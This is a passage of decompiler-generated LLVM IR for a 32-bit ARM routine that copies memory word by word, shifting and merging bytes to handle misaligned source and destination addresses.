  %v0_172b4 = phi i32 [ %v0_171c0, %dec_label_pc_171e0 ], [ %v0_172ac, %dec_label_pc_172ac ]
  %v1_172b4 = and i32 %v0_172b4, -4
  store i32 %v1_172b4, i32* %r1.global-to-local, align 4
  %v1_172b8 = inttoptr i32 %v1_172b4 to i32*
  %v2_172b8 = load i32, i32* %v1_172b8, align 4
  store i32 %v2_172b8, i32* @lr, align 4
  %v4_172b8 = add i32 %v1_172b4, 4
  store i32 %v4_172b8, i32* %r1.global-to-local, align 4
  %v2_173a0 = add i32 %v0_173a8, -12
  %v4_173a0 = sub i32 11, %v0_173a8
  %v5_173a0 = and i32 %v4_173a0, %v0_173a8
  %v6_173a0 = icmp slt i32 %v5_173a0, 0
  store i1 %v6_173a0, i1* %cpsr_v.global-to-local, align 1
  %v7_173a0 = icmp slt i32 %v2_173a0, 0
  store i1 %v7_173a0, i1* %cpsr_n.global-to-local, align 1
  %v5_173a4 = icmp slt i32 %v0_173a8, 12
  switch i2 %v0_172bc.off0, label %dec_label_pc_172c8 [
    i2 -1, label %dec_label_pc_173a0
    i2 -2, label %dec_label_pc_17334
  ]

dec_label_pc_172c8:                               ; preds = %dec_label_pc_172b4
  br i1 %v5_173a4, label %dec_label_pc_17314, label %dec_label_pc_172d0

dec_label_pc_172d0:                               ; preds = %dec_label_pc_172c8
  store i32 %v2_173a0, i32* %r2.global-to-local, align 4
  %v3_172d4 = load i32, i32* @r4, align 4
  store i32 %v3_172d4, i32* %stack_var_-16, align 4
  %v6_172d4 = load i32, i32* @r5, align 4
  store i32 %v6_172d4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_172d8

dec_label_pc_172d8:                               ; preds = %dec_label_pc_172d8.dec_label_pc_172d8_crit_edge, %dec_label_pc_172d0
  %v0_172fc = phi i32 [ %v12_172fc, %dec_label_pc_172d8.dec_label_pc_172d8_crit_edge ], [ %v0_172fc75, %dec_label_pc_172d0 ]
  %v0_172dc = phi i32 [ %v0_172dc.pre, %dec_label_pc_172d8.dec_label_pc_172d8_crit_edge ], [ %v4_172b8, %dec_label_pc_172d0 ]
  %v0_172d8 = phi i32 [ %v0_172d8.pre, %dec_label_pc_172d8.dec_label_pc_172d8_crit_edge ], [ %v2_172b8, %dec_label_pc_172d0 ]
  %v3_172d8 = udiv i32 %v0_172d8, 256
  store i32 %v3_172d8, i32* %r3.global-to-local, align 4
  %v1_172dc = inttoptr i32 %v0_172dc to i32*
  %v2_172dc = load i32, i32* %v1_172dc, align 4
  store i32 %v2_172dc, i32* %r4.global-to-local, align 4
  %v3_172dc = add i32 %v0_172dc, 4
  %v4_172dc = inttoptr i32 %v3_172dc to i32*
  %v5_172dc = load i32, i32* %v4_172dc, align 4
  store i32 %v5_172dc, i32* %r5.global-to-local, align 4
  %v6_172dc = add i32 %v0_172dc, 8
  %v7_172dc = inttoptr i32 %v6_172dc to i32*
  %v8_172dc = load i32, i32* %v7_172dc, align 4
  store i32 %v8_172dc, i32* %ip.global-to-local, align 4
  %v9_172dc = add i32 %v0_172dc, 12
  %v10_172dc = inttoptr i32 %v9_172dc to i32*
  %v11_172dc = load i32, i32* %v10_172dc, align 4
  store i32 %v11_172dc, i32* @lr, align 4
  %v12_172dc = add i32 %v0_172dc, 16
  store i32 %v12_172dc, i32* %r1.global-to-local, align 4
  %v4_172e0 = mul i32 %v2_172dc, 16777216
  %v5_172e0 = or i32 %v4_172e0, %v3_172d8
  store i32 %v5_172e0, i32* %r3.global-to-local, align 4
  %v3_172e4 = udiv i32 %v2_172dc, 256
  %v4_172e8 = mul i32 %v5_172dc, 16777216
  %v5_172e8 = or i32 %v4_172e8, %v3_172e4
  store i32 %v5_172e8, i32* %r4.global-to-local, align 4
  %v3_172ec = udiv i32 %v5_172dc, 256
  %v4_172f0 = mul i32 %v8_172dc, 16777216
  %v5_172f0 = or i32 %v4_172f0, %v3_172ec
  store i32 %v5_172f0, i32* %r5.global-to-local, align 4
  %v3_172f4 = udiv i32 %v8_172dc, 256
  %v4_172f8 = mul i32 %v11_172dc, 16777216
  %v5_172f8 = or i32 %v4_172f8, %v3_172f4
  store i32 %v5_172f8, i32* @ip, align 4
  %v1_172fc = inttoptr i32 %v0_172fc to i32*
  store i32 %v5_172e0, i32* %v1_172fc, align 4
  %v3_172fc = add i32 %v0_172fc, 4
  %v4_172fc = inttoptr i32 %v3_172fc to i32*
  %v5_172fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_172fc, i32* %v4_172fc, align 4
  %v6_172fc = add i32 %v0_172fc, 8
  %v7_172fc = inttoptr i32 %v6_172fc to i32*
  %v8_172fc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_172fc, i32* %v7_172fc, align 4
  %v9_172fc = add i32 %v0_172fc, 12
  %v10_172fc = inttoptr i32 %v9_172fc to i32*
  %v11_172fc = load i32, i32* @ip, align 4
  store i32 %v11_172fc, i32* %v10_172fc, align 4
  %v12_172fc = add i32 %v0_172fc, 16
  store i32 %v12_172fc, i32* %r0.global-to-local, align 4
  %v0_17300 = load i32, i32* %r2.global-to-local, align 4
  %v2_17300 = add i32 %v0_17300, -16
  store i32 %v2_17300, i32* %r2.global-to-local, align 4
  %v6_17304 = icmp slt i32 %v0_17300, 16
  br i1 %v6_17304, label %dec_label_pc_17308, label %dec_label_pc_172d8.dec_label_pc_172d8_crit_edge

dec_label_pc_172d8.dec_label_pc_172d8_crit_edge:  ; preds = %dec_label_pc_172d8
  %v0_172d8.pre = load i32, i32* @lr, align 4
  %v0_172dc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_172d8

dec_label_pc_17308:                               ; preds = %dec_label_pc_172d8
  %v2_17308 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17308, i32* @r4, align 4
  %v5_17308 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17308, i32* @r5, align 4
  %v2_1730c = add i32 %v0_17300, -4
  store i32 %v2_1730c, i32* %r2.global-to-local, align 4
  %v4_1730c = add i32 %v0_17300, 2147483632
  %v5_1730c = and i32 %v2_1730c, %v4_1730c
  %v6_1730c = icmp slt i32 %v5_1730c, 0
  store i1 %v6_1730c, i1* %cpsr_v.global-to-local, align 1
  %v7_1730c = icmp slt i32 %v2_1730c, 0
  store i1 %v7_1730c, i1* %cpsr_n.global-to-local, align 1
  %v5_17310 = icmp slt i32 %v2_17300, -12
  br i1 %v5_17310, label %dec_label_pc_1732c, label %dec_label_pc_17314

dec_label_pc_17314:                               ; preds = %dec_label_pc_17308, %dec_label_pc_172c8, %dec_label_pc_17314
  %v1_17320 = phi i32 [ %v4_17320, %dec_label_pc_17314 ], [ %v12_172fc, %dec_label_pc_17308 ], [ %v0_172fc75, %dec_label_pc_172c8 ]
  %v0_17314 = load i32, i32* @lr, align 4
  %v3_17314 = udiv i32 %v0_17314, 256
  store i32 %v3_17314, i32* %ip.global-to-local, align 4
  %v0_17318 = load i32, i32* %r1.global-to-local, align 4
  %v1_17318 = inttoptr i32 %v0_17318 to i32*
  %v2_17318 = load i32, i32* %v1_17318, align 4
  store i32 %v2_17318, i32* @lr, align 4
  %v4_17318 = add i32 %v0_17318, 4
  store i32 %v4_17318, i32* %r1.global-to-local, align 4
  %v4_1731c = mul i32 %v2_17318, 16777216
  %v5_1731c = or i32 %v4_1731c, %v3_17314
  store i32 %v5_1731c, i32* @ip, align 4
  %v2_17320 = inttoptr i32 %v1_17320 to i32*
  store i32 %v5_1731c, i32* %v2_17320, align 4
  %v3_17320 = load i32, i32* %r0.global-to-local, align 4
  %v4_17320 = add i32 %v3_17320, 4
  store i32 %v4_17320, i32* %r0.global-to-local, align 4
  %v0_17324 = load i32, i32* %r2.global-to-local, align 4
  %v2_17324 = add i32 %v0_17324, -4
  store i32 %v2_17324, i32* %r2.global-to-local, align 4
  %v6_17328 = icmp slt i32 %v0_17324, 4
  br i1 %v6_17328, label %dec_label_pc_1732c.loopexit, label %dec_label_pc_17314

dec_label_pc_1732c.loopexit:                      ; preds = %dec_label_pc_17314
  %v4_17324 = sub i32 3, %v0_17324
  %v5_17324 = and i32 %v4_17324, %v0_17324
  %v6_17324 = icmp slt i32 %v5_17324, 0
  %v7_17324 = icmp slt i32 %v2_17324, 0
  store i1 %v6_17324, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17324, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1732c

dec_label_pc_1732c:                               ; preds = %dec_label_pc_1732c.loopexit, %dec_label_pc_17308
  %v2_1726c113 = phi i32 [ %v4_17320, %dec_label_pc_1732c.loopexit ], [ %v12_172fc, %dec_label_pc_17308 ]
  %v0_1725c109 = phi i32 [ %v2_17324, %dec_label_pc_1732c.loopexit ], [ %v2_1730c, %dec_label_pc_17308 ]
  %v0_1732c = load i32, i32* %r1.global-to-local, align 4
  %v1_1732c = add i32 %v0_1732c, -3
  store i32 %v1_1732c, i32* @r1, align 4
  br label %bb133

dec_label_pc_17334:                               ; preds = %dec_label_pc_172b4
  br i1 %v5_173a4, label %dec_label_pc_17380, label %dec_label_pc_1733c

dec_label_pc_1733c:                               ; preds = %dec_label_pc_17334
  store i32 %v2_173a0, i32* %r2.global-to-local, align 4
  %v3_17340 = load i32, i32* @r4, align 4
  store i32 %v3_17340, i32* %stack_var_-16, align 4
  %v6_17340 = load i32, i32* @r5, align 4
  store i32 %v6_17340, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17344

dec_label_pc_17344:                               ; preds = %dec_label_pc_17344.dec_label_pc_17344_crit_edge, %dec_label_pc_1733c
  %v0_17368 = phi i32 [ %v12_17368, %dec_label_pc_17344.dec_label_pc_17344_crit_edge ], [ %v0_172fc75, %dec_label_pc_1733c ]
  %v0_17348 = phi i32 [ %v0_17348.pre, %dec_label_pc_17344.dec_label_pc_17344_crit_edge ], [ %v4_172b8, %dec_label_pc_1733c ]
  %v0_17344 = phi i32 [ %v0_17344.pre, %dec_label_pc_17344.dec_label_pc_17344_crit_edge ], [ %v2_172b8, %dec_label_pc_1733c ]
  %v3_17344 = udiv i32 %v0_17344, 65536
  store i32 %v3_17344, i32* %r3.global-to-local, align 4
  %v1_17348 = inttoptr i32 %v0_17348 to i32*
  %v2_17348 = load i32, i32* %v1_17348, align 4
  store i32 %v2_17348, i32* %r4.global-to-local, align 4
  %v3_17348 = add i32 %v0_17348, 4
  %v4_17348 = inttoptr i32 %v3_17348 to i32*
  %v5_17348 = load i32, i32* %v4_17348, align 4
  store i32 %v5_17348, i32* %r5.global-to-local, align 4
  %v6_17348 = add i32 %v0_17348, 8
  %v7_17348 = inttoptr i32 %v6_17348 to i32*
  %v8_17348 = load i32, i32* %v7_17348, align 4
  store i32 %v8_17348, i32* %ip.global-to-local, align 4
  %v9_17348 = add i32 %v0_17348, 12
  %v10_17348 = inttoptr i32 %v9_17348 to i32*
  %v11_17348 = load i32, i32* %v10_17348, align 4
  store i32 %v11_17348, i32* @lr, align 4
  %v12_17348 = add i32 %v0_17348, 16
  store i32 %v12_17348, i32* %r1.global-to-local, align 4
  %v4_1734c = mul i32 %v2_17348, 65536
  %v5_1734c = or i32 %v4_1734c, %v3_17344
  store i32 %v5_1734c, i32* %r3.global-to-local, align 4
  %v3_17350 = udiv i32 %v2_17348, 65536
  %v4_17354 = mul i32 %v5_17348, 65536
  %v5_17354 = or i32 %v4_17354, %v3_17350
  store i32 %v5_17354, i32* %r4.global-to-local, align 4
  %v3_17358 = udiv i32 %v5_17348, 65536
  %v4_1735c = mul i32 %v8_17348, 65536
  %v5_1735c = or i32 %v4_1735c, %v3_17358
  store i32 %v5_1735c, i32* %r5.global-to-local, align 4
  %v3_17360 = udiv i32 %v8_17348, 65536
  %v4_17364 = mul i32 %v11_17348, 65536
  %v5_17364 = or i32 %v4_17364, %v3_17360
  store i32 %v5_17364, i32* @ip, align 4
  %v1_17368 = inttoptr i32 %v0_17368 to i32*
  store i32 %v5_1734c, i32* %v1_17368, align 4
  %v3_17368 = add i32 %v0_17368, 4
  %v4_17368 = inttoptr i32 %v3_17368 to i32*
  %v5_17368 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17368, i32* %v4_17368, align 4
  %v6_17368 = add i32 %v0_17368, 8
  %v7_17368 = inttoptr i32 %v6_17368 to i32*
  %v8_17368 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17368, i32* %v7_17368, align 4
  %v9_17368 = add i32 %v0_17368, 12
  %v10_17368 = inttoptr i32 %v9_17368 to i32*
  %v11_17368 = load i32, i32* @ip, align 4
  store i32 %v11_17368, i32* %v10_17368, align 4
  %v12_17368 = add i32 %v0_17368, 16
  store i32 %v12_17368, i32* %r0.global-to-local, align 4
  %v0_1736c = load i32, i32* %r2.global-to-local, align 4
  %v2_1736c = add i32 %v0_1736c, -16
  store i32 %v2_1736c, i32* %r2.global-to-local, align 4
  %v6_17370 = icmp slt i32 %v0_1736c, 16
  br i1 %v6_17370, label %dec_label_pc_17374, label %dec_label_pc_17344.dec_label_pc_17344_crit_edge

dec_label_pc_17344.dec_label_pc_17344_crit_edge:  ; preds = %dec_label_pc_17344
  %v0_17344.pre = load i32, i32* @lr, align 4
  %v0_17348.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17344

dec_label_pc_17374:                               ; preds = %dec_label_pc_17344
  %v2_17374 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17374, i32* @r4, align 4
  %v5_17374 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17374, i32* @r5, align 4
  %v2_17378 = add i32 %v0_1736c, -4
  store i32 %v2_17378, i32* %r2.global-to-local, align 4
  %v4_17378 = add i32 %v0_1736c, 2147483632
  %v5_17378 = and i32 %v2_17378, %v4_17378
  %v6_17378 = icmp slt i32 %v5_17378, 0
  store i1 %v6_17378, i1* %cpsr_v.global-to-local, align 1
  %v7_17378 = icmp slt i32 %v2_17378, 0
  store i1 %v7_17378, i1* %cpsr_n.global-to-local, align 1
  %v5_1737c = icmp slt i32 %v2_1736c, -12
  br i1 %v5_1737c, label %dec_label_pc_17398, label %dec_label_pc_17380

dec_label_pc_17380:                               ; preds = %dec_label_pc_17374, %dec_label_pc_17334, %dec_label_pc_17380
  %v1_1738c = phi i32 [ %v4_1738c, %dec_label_pc_17380 ], [ %v12_17368, %dec_label_pc_17374 ], [ %v0_172fc75, %dec_label_pc_17334 ]
  %v0_17380 = load i32, i32* @lr, align 4
  %v3_17380 = udiv i32 %v0_17380, 65536
  store i32 %v3_17380, i32* %ip.global-to-local, align 4
  %v0_17384 = load i32, i32* %r1.global-to-local, align 4
  %v1_17384 = inttoptr i32 %v0_17384 to i32*
  %v2_17384 = load i32, i32* %v1_17384, align 4
  store i32 %v2_17384, i32* @lr, align 4
  %v4_17384 = add i32 %v0_17384, 4
  store i32 %v4_17384, i32* %r1.global-to-local, align 4
  %v4_17388 = mul i32 %v2_17384, 65536
  %v5_17388 = or i32 %v4_17388, %v3_17380
  store i32 %v5_17388, i32* @ip, align 4
  %v2_1738c = inttoptr i32 %v1_1738c to i32*
  store i32 %v5_17388, i32* %v2_1738c, align 4
  %v3_1738c = load i32, i32* %r0.global-to-local, align 4
  %v4_1738c = add i32 %v3_1738c, 4
  store i32 %v4_1738c, i32* %r0.global-to-local, align 4
  %v0_17390 = load i32, i32* %r2.global-to-local, align 4
  %v2_17390 = add i32 %v0_17390, -4
  store i32 %v2_17390, i32* %r2.global-to-local, align 4
  %v6_17394 = icmp slt i32 %v0_17390, 4
  br i1 %v6_17394, label %dec_label_pc_17398.loopexit, label %dec_label_pc_17380

dec_label_pc_17398.loopexit:                      ; preds = %dec_label_pc_17380
  %v4_17390 = sub i32 3, %v0_17390
  %v5_17390 = and i32 %v4_17390, %v0_17390
  %v6_17390 = icmp slt i32 %v5_17390, 0
  %v7_17390 = icmp slt i32 %v2_17390, 0
  store i1 %v6_17390, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17390, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17398

dec_label_pc_17398:                               ; preds = %dec_label_pc_17398.loopexit, %dec_label_pc_17374
  %v2_1726c112 = phi i32 [ %v4_1738c, %dec_label_pc_17398.loopexit ], [ %v12_17368, %dec_label_pc_17374 ]
  %v0_1725c108 = phi i32 [ %v2_17390, %dec_label_pc_17398.loopexit ], [ %v2_17378, %dec_label_pc_17374 ]
  %v0_17398 = load i32, i32* %r1.global-to-local, align 4
  %v1_17398 = add i32 %v0_17398, -2
  store i32 %v1_17398, i32* @r1, align 4
  br label %bb133

dec_label_pc_173a0:                               ; preds = %dec_label_pc_172b4
  br i1 %v5_173a4, label %dec_label_pc_173ec, label %dec_label_pc_173a8

dec_label_pc_173a8:                               ; preds = %dec_label_pc_173a0
  store i32 %v2_173a0, i32* %r2.global-to-local, align 4
  %v3_173ac = load i32, i32* @r4, align 4
  store i32 %v3_173ac, i32* %stack_var_-16, align 4
  %v6_173ac = load i32, i32* @r5, align 4
  store i32 %v6_173ac, i32* %stack_var_-12, align 4
  br label %dec_label_pc_173b0

dec_label_pc_173b0:                               ; preds = %dec_label_pc_173b0.dec_label_pc_173b0_crit_edge, %dec_label_pc_173a8
  %v0_173d4 = phi i32 [ %v12_173d4, %dec_label_pc_173b0.dec_label_pc_173b0_crit_edge ], [ %v0_172fc75, %dec_label_pc_173a8 ]
  %v0_173b4 = phi i32 [ %v0_173b4.pre, %dec_label_pc_173b0.dec_label_pc_173b0_crit_edge ], [ %v4_172b8, %dec_label_pc_173a8 ]
  %v0_173b0 = phi i32 [ %v0_173b0.pre, %dec_label_pc_173b0.dec_label_pc_173b0_crit_edge ], [ %v2_172b8, %dec_label_pc_173a8 ]
  %v3_173b0 = udiv i32 %v0_173b0, 16777216
  store i32 %v3_173b0, i32* %r3.global-to-local, align 4
  %v1_173b4 = inttoptr i32 %v0_173b4 to i32*
  %v2_173b4 = load i32, i32* %v1_173b4, align 4
  store i32 %v2_173b4, i32* %r4.global-to-local, align 4
  %v3_173b4 = add i32 %v0_173b4, 4
  %v4_173b4 = inttoptr i32 %v3_173b4 to i32*
  %v5_173b4 = load i32, i32* %v4_173b4, align 4
  store i32 %v5_173b4, i32* %r5.global-to-local, align 4
  %v6_173b4 = add i32 %v0_173b4, 8
  %v7_173b4 = inttoptr i32 %v6_173b4 to i32*
  %v8_173b4 = load i32, i32* %v7_173b4, align 4
  store i32 %v8_173b4, i32* %ip.global-to-local, align 4
  %v9_173b4 = add i32 %v0_173b4, 12
  %v10_173b4 = inttoptr i32 %v9_173b4 to i32*
  %v11_173b4 = load i32, i32* %v10_173b4, align 4
  store i32 %v11_173b4, i32* @lr, align 4
  %v12_173b4 = add i32 %v0_173b4, 16
  store i32 %v12_173b4, i32* %r1.global-to-local, align 4
  %v4_173b8 = mul i32 %v2_173b4, 256
  %v5_173b8 = or i32 %v4_173b8, %v3_173b0
  store i32 %v5_173b8, i32* %r3.global-to-local, align 4
  %v3_173bc = udiv i32 %v2_173b4, 16777216
  %v4_173c0 = mul i32 %v5_173b4, 256
  %v5_173c0 = or i32 %v4_173c0, %v3_173bc
  store i32 %v5_173c0, i32* %r4.global-to-local, align 4
  %v3_173c4 = udiv i32 %v5_173b4, 16777216
  %v4_173c8 = mul i32 %v8_173b4, 256
  %v5_173c8 = or i32 %v4_173c8, %v3_173c4
  store i32 %v5_173c8, i32* %r5.global-to-local, align 4
  %v3_173cc = udiv i32 %v8_173b4, 16777216
  %v4_173d0 = mul i32 %v11_173b4, 256
  %v5_173d0 = or i32 %v4_173d0, %v3_173cc
  store i32 %v5_173d0, i32* @ip, align 4
  %v1_173d4 = inttoptr i32 %v0_173d4 to i32*
  store i32 %v5_173b8, i32* %v1_173d4, align 4
  %v3_173d4 = add i32 %v0_173d4, 4
  %v4_173d4 = inttoptr i32 %v3_173d4 to i32*
  %v5_173d4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_173d4, i32* %v4_173d4, align 4
  %v6_173d4 = add i32 %v0_173d4, 8
  %v7_173d4 = inttoptr i32 %v6_173d4 to i32*
  %v8_173d4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_173d4, i32* %v7_173d4, align 4
  %v9_173d4 = add i32 %v0_173d4, 12
  %v10_173d4 = inttoptr i32 %v9_173d4 to i32*
  %v11_173d4 = load i32, i32* @ip, align 4
  store i32 %v11_173d4, i32* %v10_173d4, align 4
  %v12_173d4 = add i32 %v0_173d4, 16
  store i32 %v12_173d4, i32* %r0.global-to-local, align 4
  %v0_173d8 = load i32, i32* %r2.global-to-local, align 4
  %v2_173d8 = add i32 %v0_173d8, -16
  store i32 %v2_173d8, i32* %r2.global-to-local, align 4
  %v6_173dc = icmp slt i32 %v0_173d8, 16
  br i1 %v6_173dc, label %dec_label_pc_173e0, label %dec_label_pc_173b0.dec_label_pc_173b0_crit_edge

dec_label_pc_173b0.dec_label_pc_173b0_crit_edge:  ; preds = %dec_label_pc_173b0
  %v0_173b0.pre = load i32, i32* @lr, align 4
  %v0_173b4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_173b0

dec_label_pc_173e0:                               ; preds = %dec_label_pc_173b0
  %v2_173e0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_173e0, i32* @r4, align 4
  %v5_173e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_173e0, i32* @r5, align 4
  %v2_173e4 = add i32 %v0_173d8, -4
  store i32 %v2_173e4, i32* %r2.global-to-local, align 4
  %v4_173e4 = add i32 %v0_173d8, 2147483632
  %v5_173e4 = and i32 %v2_173e4, %v4_173e4
  %v6_173e4 = icmp slt i32 %v5_173e4, 0
  store i1 %v6_173e4, i1* %cpsr_v.global-to-local, align 1
  %v7_173e4 = icmp slt i32 %v2_173e4, 0
  store i1 %v7_173e4, i1* %cpsr_n.global-to-local, align 1
  %v5_173e8 = icmp slt i32 %v2_173d8, -12
  br i1 %v5_173e8, label %dec_label_pc_17404, label %dec_label_pc_173ec

dec_label_pc_173ec:                               ; preds = %dec_label_pc_173e0, %dec_label_pc_173a0, %dec_label_pc_173ec
  %v1_173f8 = phi i32 [ %v4_173f8, %dec_label_pc_173ec ], [ %v12_173d4, %dec_label_pc_173e0 ], [ %v0_172fc75, %dec_label_pc_173a0 ]
  %v0_173ec = load i32, i32* @lr, align 4
  %v3_173ec = udiv i32 %v0_173ec, 16777216
  store i32 %v3_173ec, i32* %ip.global-to-local, align 4
  %v0_173f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_173f0 = inttoptr i32 %v0_173f0 to i32*
  %v2_173f0 = load i32, i32* %v1_173f0, align 4
  store i32 %v2_173f0, i32* @lr, align 4
  %v4_173f0 = add i32 %v0_173f0, 4
  store i32 %v4_173f0, i32* %r1.global-to-local, align 4
  %v4_173f4 = mul i32 %v2_173f0, 256
  %v5_173f4 = or i32 %v4_173f4, %v3_173ec
  store i32 %v5_173f4, i32* @ip, align 4
  %v2_173f8 = inttoptr i32 %v1_173f8 to i32*
  store i32 %v5_173f4, i32* %v2_173f8, align 4
  %v3_173f8 = load i32, i32* %r0.global-to-local, align 4
  %v4_173f8 = add i32 %v3_173f8, 4
  store i32 %v4_173f8, i32* %r0.global-to-local, align 4
  %v0_173fc = load i32, i32* %r2.global-to-local, align 4
  %v2_173fc = add i32 %v0_173fc, -4
  store i32 %v2_173fc, i32* %r2.global-to-local, align 4
  %v6_17400 = icmp slt i32 %v0_173fc, 4
  br i1 %v6_17400, label %dec_label_pc_17404.loopexit, label %dec_label_pc_173ec

dec_label_pc_17404.loopexit:                      ; preds = %dec_label_pc_173ec
  %v4_173fc = sub i32 3, %v0_173fc
  %v5_173fc = and i32 %v4_173fc, %v0_173fc
  %v6_173fc = icmp slt i32 %v5_173fc, 0
  %v7_173fc = icmp slt i32 %v2_173fc, 0
  store i1 %v6_173fc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_173fc, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_17404

dec_label_pc_17404:                               ; preds = %dec_label_pc_17404.loopexit, %dec_label_pc_173e0
  %v2_1726c114 = phi i32 [ %v4_173f8, %dec_label_pc_17404.loopexit ], [ %v12_173d4, %dec_label_pc_173e0 ]
  %v0_1725c110 = phi i32 [ %v2_173fc, %dec_label_pc_17404.loopexit ], [ %v2_173e4, %dec_label_pc_173e0 ]
  %v0_17404 = load i32, i32* %r1.global-to-local, align 4
  %v1_17404 = add i32 %v0_17404, -1
  store i32 %v1_17404, i32* @r1, align 4
  br label %bb133

dec_label_pc_1740c:                               ; preds = %entry
  %v1_1740c = load i32, i32* @r2, align 4
  %v2_1740c = add i32 %v1_1740c, %v0_171c0
  store i32 %v2_1740c, i32* @r1, align 4
  %v2_17410 = add i32 %v1_1740c, %v1_171c0
  store i32 %v2_17410, i32* %r0.global-to-local, align 4
  %v2_17414 = add i32 %v1_1740c, -4
  store i32 %v2_17414, i32* %r2.global-to-local, align 4
  %v4_17414 = sub i32 3, %v1_1740c
  %v5_17414 = and i32 %v4_17414, %v1_1740c
  %v6_17414 = icmp slt i32 %v5_17414, 0
  store i1 %v6_17414, i1* %cpsr_v.global-to-local, align 1
  %v7_17414 = icmp slt i32 %v2_17414, 0
  store i1 %v7_17414, i1* %cpsr_n.global-to-local, align 1
  %v5_17418 = icmp slt i32 %v1_1740c, 4
  br i1 %v5_17418, label %bb143, label %dec_label_pc_1741c

dec_label_pc_1741c:                               ; preds = %dec_label_pc_1740c
  %v1_1741c = urem i32 %v2_17410, 4
  store i32 %v1_1741c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1741c = icmp eq i32 %v1_1741c, 0
  br i1 %v2_1741c, label %dec_label_pc_17424, label %dec_label_pc_174c4

dec_label_pc_17424:                               ; preds = %dec_label_pc_1741c
  %v1_17424 = urem i32 %v2_1740c, 4
  store i32 %v1_17424, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17424 = icmp eq i32 %v1_17424, 0
  br i1 %v2_17424, label %dec_label_pc_1742c, label %dec_label_pc_174f0

dec_label_pc_1742c:                               ; preds = %dec_label_pc_17424, %dec_label_pc_174e8
  %v0_1744449 = phi i32 [ %v2_17410, %dec_label_pc_17424 ], [ %v0_1753832, %dec_label_pc_174e8 ]
  %v0_1744048 = phi i32 [ %v2_1740c, %dec_label_pc_17424 ], [ %v0_174e8, %dec_label_pc_174e8 ]
  %v0_1742c = phi i32 [ %v2_17414, %dec_label_pc_17424 ], [ %v2_174e0, %dec_label_pc_174e8 ]
  %v2_1742c = add i32 %v0_1742c, -8
  store i32 %v2_1742c, i32* %r2.global-to-local, align 4
  %v4_1742c = sub i32 7, %v0_1742c
  %v5_1742c = and i32 %v4_1742c, %v0_1742c
  %v6_1742c = icmp slt i32 %v5_1742c, 0
  store i1 %v6_1742c, i1* %cpsr_v.global-to-local, align 1
  %v7_1742c = icmp slt i32 %v2_1742c, 0
  store i1 %v7_1742c, i1* %cpsr_n.global-to-local, align 1
  %v5_17430 = icmp slt i32 %v0_1742c, 8
  br i1 %v5_17430, label %dec_label_pc_1747c, label %dec_label_pc_17434

dec_label_pc_17434:                               ; preds = %dec_label_pc_1742c
  %v3_17434 = load i32, i32* @r4, align 4
  %v5_17434 = inttoptr i32 %v3_17434 to i8*
  store i8* %v5_17434, i8** %stack_var_-8, align 4
  %v8_17434 = load i32, i32* @lr, align 4
  %v2_17438 = add i32 %v0_1742c, -28
  store i32 %v2_17438, i32* %r2.global-to-local, align 4
  %v4_17438 = sub i32 27, %v0_1742c
  %v5_17438 = and i32 %v4_17438, %v2_1742c
  %v6_17438 = icmp slt i32 %v5_17438, 0
  store i1 %v6_17438, i1* %cpsr_v.global-to-local, align 1
  %v7_17438 = icmp slt i32 %v2_17438, 0
  store i1 %v7_17438, i1* %cpsr_n.global-to-local, align 1
  %v5_1743c = icmp slt i32 %v2_1742c, 20
  br i1 %v5_1743c, label %dec_label_pc_17458, label %dec_label_pc_17440

dec_label_pc_17440:                               ; preds = %dec_label_pc_17434, %dec_label_pc_17440.dec_label_pc_17440_crit_edge
  %v0_17444 = phi i32 [ %v1_1744c, %dec_label_pc_17440.dec_label_pc_17440_crit_edge ], [ %v0_1744449, %dec_label_pc_17434 ]
  %v0_17440 = phi i32 [ %v0_17440.pre, %dec_label_pc_17440.dec_label_pc_17440_crit_edge ], [ %v0_1744048, %dec_label_pc_17434 ]
  %v1_17440 = add i32 %v0_17440, -4
  %v2_17440 = inttoptr i32 %v1_17440 to i32*
  %v3_17440 = load i32, i32* %v2_17440, align 4
  store i32 %v3_17440, i32* %r3.global-to-local, align 4
  %v4_17440 = add i32 %v0_17440, -8
  %v5_17440 = inttoptr i32 %v4_17440 to i32*
  %v6_17440 = load i32, i32* %v5_17440, align 4
  store i32 %v6_17440, i32* %r4.global-to-local, align 4
  %v7_17440 = add i32 %v0_17440, -12
  %v8_17440 = inttoptr i32 %v7_17440 to i32*
  %v9_17440 = load i32, i32* %v8_17440, align 4
  store i32 %v9_17440, i32* %ip.global-to-local, align 4
  %v10_17440 = add i32 %v0_17440, -16
  %v11_17440 = inttoptr i32 %v10_17440 to i32*
  %v12_17440 = load i32, i32* %v11_17440, align 4
  store i32 %v12_17440, i32* %lr.global-to-local, align 4
  store i32 %v10_17440, i32* %r1.global-to-local, align 4
  %v1_17444 = add i32 %v0_17444, -16
  %v2_17444 = inttoptr i32 %v1_17444 to i32*
  store i32 %v3_17440, i32* %v2_17444, align 4
  %v4_17444 = add i32 %v0_17444, -12
  %v5_17444 = inttoptr i32 %v4_17444 to i32*
  %v6_17444 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_17444, i32* %v5_17444, align 4
